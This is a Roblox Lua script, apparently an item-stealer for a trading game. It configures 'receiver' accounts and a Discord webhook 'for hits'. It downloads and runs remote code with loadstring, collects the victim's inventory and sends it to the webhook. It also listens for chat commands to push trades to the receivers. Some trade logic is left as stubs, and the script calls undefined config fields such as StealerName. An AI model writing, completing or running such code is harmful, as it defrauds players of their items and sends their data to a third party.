Config = {
    Receivers = {"1LazySly8", "QuadCoreDragon"}, -- Your Username(s).
    Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
    FullInventory = false, -- Display all player items if true.
    GoodItemsOnly = false, -- Only alerts if player has legendary or above items.
    ResendTrade = ".", -- Resend trade command.
    Script = "None", -- Script options: "None", "Custom", "Highlight Hub".
    CustomLink = "None" -- Provide custom URL if Script is set to "Custom".
}

-- Basic script setup
repeat wait() until game:IsLoaded()
if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

-- Webhook setup
local LogsWebhook = Config.Webhook
local LOGS_WEBS = LogsWebhook
local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade

-- Configuration validation
local function sendNotification(message)
    Notification:Notify(
        {Title = "[ "..Config.StealerName.." ]", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
    )
end

if not LogsWebhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    sendNotification("Invalid webhook URL!")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    sendNotification("Receivers table is empty or invalid!")
    return
end

-- Trade functions
local function TapUI(button)
    if button then
        for _, event in ipairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
            for _, connection in ipairs(getconnections(button[event])) do
                connection:Fire()
            end
        end
    end
end

-- Inventory processing
local function collectInventory()
    local Inventory = {}
    local ItemsByRarity = {
        Ancient = {}, Godly = {}, Unique = {}, Vintage = {},
        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
    }
    -- Add your item collection logic here

    -- Send inventory data to webhook
    local data = {
        username = Config.StealerName,
        avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif",
        content = "Join through this code **" .. Config.TeleportScript .. "**!",
        embeds = {{
            title = "ðŸ’» **__"..Config.StealerName.."__ | __Inventory Report__**",
            description = "**Player Information:** \n" .. table.concat(Config.Receivers, ", ") .. "\nðŸŽ’ **Inventory:** \n" .. table.concat(Inventory, ", ")
        }}
    }
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = Config.Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- Chat listener for trade resend
Players.PlayerAdded:Connect(function(player)
    if table.find(Config.Receivers, player.Name) then
        player.Chatted:Connect(function(msg)
            if msg == Config.ResendTrade then
                -- Insert trade logic here
            end
        end)
    end
end)

-- Main execution
collectInventory()
